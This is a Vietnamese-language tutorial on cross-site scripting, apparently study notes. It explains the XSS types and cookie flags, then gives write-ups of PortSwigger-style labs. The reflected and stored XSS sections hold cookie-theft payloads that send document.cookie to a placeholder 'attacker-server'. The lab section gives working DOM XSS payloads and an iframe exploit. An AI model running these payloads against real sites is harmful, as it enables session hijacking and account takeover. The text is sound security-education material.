# Cross-site scripting (XSS)

## 1. XSS là gì?

XSS (Cross-Site Scripting) là một loại tấn công bảo mật trong đó kẻ tấn công chèn mã độc (thường là JavaScript) vào trang web của nạn nhân. Khi người dùng truy cập trang web đó, mã độc sẽ được thực thi trên trình duyệt của họ, cho phép kẻ tấn công thực hiện các hành động không mong muốn như:

    - Chôm cắp thông tin cá nhân (ví dụ: mật khẩu, cookie)

    - Thực hiện hành động giả mạo (ví dụ: gửi yêu cầu giả mạo đến máy chủ)

    - Cài đặt phần mềm độc hại trên máy tính của người dùng

Các lỗ hổng cross-site scripting thường cho phép kẻ tấn công ngụy trang thành người dùng nạn nhân, thực hiện bất kỳ hành động nào mà người dùng có thể thực hiện và truy cập bất kỳ dữ liệu nào của người dùng

## 2. XSS hoạt động như thế nào?

Cross-site scripting hoạt động bằng cách thao túng một trang web dễ bị tấn công để trả về JavaScript độc hại cho người dùng. Khi mã độc hại thực thi bên trong trình duyệt của nạn nhân, kẻ tấn công có thể xâm phạm hoàn toàn tương tác của họ với ứng dụng.

![img1]()

## 3. Các loại tấn công XSS

### 3.1. Reflected cross-site scripting

`Reflected XSS` là loại cross-site scripting đơn giản nhất. Nó phát sinh khi một ứng dụng nhận dữ liệu trong yêu cầu HTTP và đưa dữ liệu đó vào phản hồi ngay lập tức theo cách không an toàn.

Sau đây là một ví dụ đơn giản về lỗ hổng `Reflected XSS`:

```
https://insecure-website.com/status?message=All+is+well.
<p>Status: All is well.</p>
```

Ứng dụng không thực hiện bất kỳ xử lý dữ liệu nào khác, do đó kẻ tấn công có thể dễ dàng thực hiện một cuộc tấn công như thế này:

```
https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
<p>Status: <script>/* Bad stuff here... */</script></p>
```

Nếu người dùng truy cập URL do kẻ tấn công xây dựng, thì tập lệnh của kẻ tấn công sẽ thực thi trong trình duyệt của người dùng, trong bối cảnh phiên làm việc của người dùng đó với ứng dụng. Tại thời điểm đó, tập lệnh có thể thực hiện bất kỳ hành động nào và truy xuất bất kỳ dữ liệu nào mà người dùng có quyền truy cập.

Tóm lại đây là một lỗ hổng mà kẻ tấn công tiêm những đoạn code độc hại thông qua `URL`. Trong một cuộc tấn công `Reflected XSS` **payload** không được lưu trữ ở ứng dụng mà nó chỉ trả về với `response html`. Toàn bộ cuộc tấn công được hoàn thành trong một lần gửi request và phản hồi duy nhất.

- Một ví dụ `XSS Session Hijacking Diagram` (Đánh cắp phiên cookie của người dùng)
- Điều kiện để xảy ra điều này:

  - Cookie được sử dụng để xác định phiên
  - Không có `HTTPonly` cookie flag set
  - Không có xác thực đầu vào

```
http://victim-server?search=<script>var+img=new+image();img.src="http://attacker-server/" + document.cookie;</script>
```

![img3]()

### 3.2. Stored cross-site scripting

- `Stored XSS` (còn gọi là `XSS persistent` hoặc `second-order XSS`) phát sinh khi một ứng dụng nhận dữ liệu từ một nguồn không đáng tin cậy và đưa dữ liệu đó vào các phản hồi HTTP theo cách không an toàn.

- `Stored XSS` là một lỗ hổng xảy ra khi ứng dụng web có chức năng lưu trữ. Và được hiện thị dữ liệu trong trang. Sau đây là một số chức năng điển hình của trang web có thể tồn tại lỗ hổng Stored XSS.

  - Tin nhắn
  - Bình luận
  - Thông tin hồ sơ

- Kẻ tấn công có thể dùng `js` để tấn công như sau:

  - `Redirecting the browser`(chuyển hướng trình duyệt)
  - `Cookie Theft / Session Hijacking`(trộm cookie/chiếm quyền điều khiển phiên)
  - `Key logging`
  - `Using XSS to steal CSRF tokens`
  - `Fake login forms`
  - `Abusing HTML 5`(Lạm dụng HTML 5)

- Sau đây, là một ví dụ kẻ tấn công cướp `cookie` của nạn nhân gửi về máy chủ của mình(`Cookie Theft Example using Stored XSS`)

```
<script>var img = new image();
img.src = "http://attacker-server/" + document.cookie;</script>
```

![img04]()

Giải thích ví dụ về `XSS Cookie Theft`

- Bước 1: Kẻ tấn công gửi payload đến nạn nhân: `<script>var+img=new+image();img.src="http://attacker-server/" + document.cookie;</script>`
- Bước 2: Nạn nhân yêu cầu trang từ máy chủ, có thể là kẻ tấn công đã lừa nạn nhân truy cập trang đó hoặc mã độc XSS nằm trên một trang phổ biến.
- Bước 3: Máy chủ web cung cấp trang chứa mã XSS cho trình duyệt web của nạn nhân
- Bước 4: Trình duyệt của nạn nhân thực thi tải trọng JavaScript và yêu cầu tải hình ảnh có chứa dữ liệu cookie của nạn nhân được gửi đến máy chủ web của kẻ tấn công
- Bước 5: Kẻ tấn công hiện có mã định danh phiên của nạn nhân cho phép kẻ tấn công thực hiện việc chiếm đoạt phiên

### 4. Httponly và Secure Cookie

- `Secure Cookie`:

  - Secure cookie là một thuộc tính bảo mật được `enabled` khi sử dụng `HTTPS`, đảm bảo việc cookie luôn được mã hóa khi chuyển từ `client` đến `server`, giúp nó tránh khỏi việc bị nghe trộm làm lộ thông tin. Thêm vào đó, tất cả các cookie phải tuân theo chính sách cùng nguồn gốc (same-origin policy) của trình duyệt.

- `Httponly cookie`:

  - Thuộc tính `HttpOnly` của `cookie` được hỗ trở bởi hầu hết các trình duyệt. Một `HttpOnly session cookie` sẽ chỉ được sử dụng trong một HTTP (hoặc HTTPS) request, do đó hạn chế bị truy cập bởi các `non-HTTP APIs` chẳng hạn Javascript. Việc hạn chế này làm giảm nhẹ nhưng không loại trừ việc đánh cắp cookie thông qua lỗ hổng Cross-site scripting (XSS).

    ![img5]()

    ![img6]()

- Cấu trúc của một cookie kích thước 4KB, bao gồm 7 thành phần chính:

  ```
  Name
  Value
  Expires (hạn sử dụng)
  Path (đường dẫn đến nơi cookie có hiệu lực, “/” có nghĩa là cookie có giá trị ở bất cứ đường dẫn nào)
  Domain
  Secure
  HttpOnly
  ```

  - Hai thành phần đầu tiên (name và value) yêu cầu bắt buộc phải có.

  - Các thuộc tính của cookie:

    - Domain, Path, Expirse, Max-Age, Secure và HttpOnly.

### 5. Cross-Origin Resource Sharing (CORS) là gì?

Cross-Origin Resource Sharing (CORS) là một cơ chế bảo mật được tích hợp trong các trình duyệt web hiện đại, giúp ngăn chặn các trang web truy cập tài nguyên từ các nguồn gốc khác nhau (domain, protocol, port) mà không được phép.

CORS hoạt động dựa trên nguyên tắc "same-origin policy", nghĩa là một trang web chỉ có thể truy cập tài nguyên từ cùng một nguồn gốc (domain, protocol, port) với trang web đó. Nếu một trang web muốn truy cập tài nguyên từ một nguồn gốc khác, trình duyệt sẽ gửi một yêu cầu OPTIONS đến máy chủ của nguồn gốc đó để kiểm tra xem có cho phép truy cập hay không.

Một số `header` quan trọng trong CORS bao gồm: - Access-Control-Allow-Origin: chỉ định các nguồn gốc được phép truy cập - Access-Control-Allow-Methods: chỉ định các phương thức HTTP được phép sử dụng - Access-Control-Allow-Headers: chỉ định các header được phép gửi - Access-Control-Max-Age: chỉ định thời gian lưu trữ của phản hồi CORS

Ví dụ về cách cấu hình CORS trên máy chủ Node.js sử dụng Express.js:

```
const express = require('express');
const app = express();

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Accept');
  next();
});
```

> Trong ví dụ trên, máy chủ cho phép truy cập từ tất cả các nguồn gốc (\*), cho phép sử dụng các phương thức GET, POST, PUT, DELETE và cho phép gửi header Content-Type và Accept

## 4. Lab XSS

### 4.1. Lab: Reflected XSS into HTML context with nothing encoded

- Đề bài nói rằng để solve được lab thì hãy thực hiện cross-site scripting attack để gọi làm alert

![img7]()

![img8]()

### 4.2. Stored XSS into HTML context with nothing encoded

Chức năng comment tại mỗi post trên ứng dụng bị dính lỗi Stored XSS.

![img9]()

Comment của mình vừa nhập đã được lưu trữ lại nhằm render lại giao diện

![img10]()

Ở đây tôi sẽ chèn payload vào trường comment -> Solve

![img11]()

### 4.3. DOM XSS in document.write sink using source location.search

Lần này tôi tiếp tục thử `payload` như trên nhưng có vẻ không được

Tôi bắt đầu check source của trang web và thấy phần code xử lí như sau:

```
 <script>
                        function trackSearch(query) {
                            document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
                        }
                        var query = (new URLSearchParams(window.location.search)).get('search');
                        if(query) {
                            trackSearch(query);
                        }
                    </script>
```

- Có thể thấy nó sẽ lấy giá trị của biến `query` là `(new URLSearchParams(window.location.search)).get('search')` tức là giá trị của tham số `search`, nếu `URL` này tồn tại thì sẽ ghi lên trang web với tấm hình đó. Giải thích chi tiết hơn thì

  - `window.location.search`: Trả về chuỗi truy vấn (query string) của URL hiện tại, bao gồm cả dấu chấm hỏi ? và các cặp `key=value`. Ví dụ: nếu URL là `http://example.com/?search=apple&category=fruit` thì `window.location.search` sẽ trả về `"?search=apple&category=fruit"`

  - `new URLSearchParams(window.location.search)`: Tạo một đối tượng `URLSearchParams` để dễ dàng truy cập và thao tác với các tham số trong chuỗi truy vấn

  - `.get('search')`: Phương thức `.get()` của `URLSearchParams` lấy giá trị của tham số `search`. Nếu URL là `http://example.com/?search=apple`, thì `quer`y sẽ nhận giá trị `"apple"`. Nếu tham số `search` không tồn tại, kết quả trả về sẽ là `null`

Vận dụng điều này ta sẽ tấn công alert như sau:

```
hihi">;<script>alert(1)</script>
```

![img12]()

### 4.4. DOM XSS in innerHTML sink using source location.search

Lần này tôi sử dụng `burpsuite` cho trực quan hơn, vẫn là payload quen thuộc và sẽ thấy phần code nó thực hiện

![img13]()

- Lần này nó lấy giá trị của tham số `search` và chèn nội dung để hiển thị lên `DOM` bằng `innerHTML` nhưng mà do `innerHTML` không hỗ trợ `tag script` nên ta sẽ sử dụng một thẻ `img` đi kèm với một thuộc tính `onerror` nhằm kích hoạt và thực thi `javascript` khi có lỗi ví dụ như không thể tải được ảnh từ thuộc tính `src` của thẻ `img`

```
<img src=1 onerror=alert(1);/>
```

![img14]()

Sau đó tôi `forward` và thử thách sẽ `solve`

![img15]()

### 4.5. DOM XSS in jQuery anchor href attribute sink using location.search source

Tại form submit feedback trang web có một nút `Back` để quay về trang trước đó

Khi thực hiện một cú `request` đến `submit feedback` có thể thấy nó gọi `GET method` đến `endpoint` `/feedback?returnPath=/` và sẽ thấy được cả phần code nó thực hiện

![img16]()

```
<script>
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
</script>
```

- Lần này nó sử dụng `jQuery` để lấy giá trị của tham số `returnPath` và giá trị này sẽ được làm giá trị cho thuộc tính `href` của `id` có tên là `backLink` (đó chính là thẻ a của chức năng quay lại trang trước)

  ![img17]()

Vậy ở đây tôi sẽ sử dụng [Javascript URL scheme](https://wiki.whatwg.org/wiki/URL_schemes) là `javascript:alert(1)`. Khi sử dụng trong thanh địa chỉ của trình duyệt hoặc trong một liên kết, đoạn mã này sẽ thực thi JavaScript trực tiếp.

- Cách thức hoạt động:

  - `javascript:` Đây là tiền tố để thông báo rằng chuỗi sau đó sẽ được thực thi như mã JavaScript thay vì là một URL thông thường.

  - `alert(1)`: Gọi hàm alert() trong JavaScript, hiển thị một hộp thoại bật lên với nội dung là số 1.

    ![img18]()

  - Cuối cùng `forward` lại và thử thách sẽ được `solve`

  ![img19]()

### 4.6. DOM XSS in jQuery selector sink using a hashchange event

Source code cung cấp 1 đoạn code Jquery

![img20]()

```
$(window).on("hashchange", function () {
  var post = $(
    "section.blog-list h2:contains(" +
      decodeURIComponent(window.location.hash.slice(1)) +
      ")"
  );
  if (post) post.get(0).scrollIntoView();
});
```

- Đoạn mã này sử dụng `jQuery` để lắng nghe sự kiện `hashchange` của cửa sổ (window), và thực hiện việc cuộn đến một bài viết cụ thể trong danh sách blog dựa trên giá trị trong URL hash

  - `window.location.hash.slice(1)`: ấy phần hash trong URL (phần sau dấu #) và loại bỏ ký tự # bằng phương thức `slice(1)`

  - Sử dụng jQuery để tìm các thẻ `<h2>` nằm trong `section.blog-list` mà chứa văn bản khớp với giá trị hash từ URL

  - Test thử trên console

    ![img21]()

  - Hoặc một bài blog có thẻ h2

    ![img24]()

  - Test thử tiếp với payload `#<img src=1 onerror=alert(1) />` và nó đã hiện ra alert `(1)` nhưng vẫn không `solve`

    ![img22]()

  - Quay lại mô tả của bài lab thì để có thể solve được cần `deliver an exploit to the victim that calls the print() 
function in their browser.`

  - Di chuyển đến trang exploit của server `https://exploit-0aed003d04f623a3824df04d01f500a9.exploit-server.net/`

  - Đề bài có gợi ý là sẽ nhúng 1 thẻ `iframe` vào body section

    ```
    <iframe src="https://0ae200de04ac234982b9f117000800f4.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
    ```

  - Lúc này tại máy nạn nhân, hàm `print()` được thực thi và ta solve được challenge.

    ![img25]()

### 4.7. Reflected XSS into attribute with angle brackets HTML-encoded
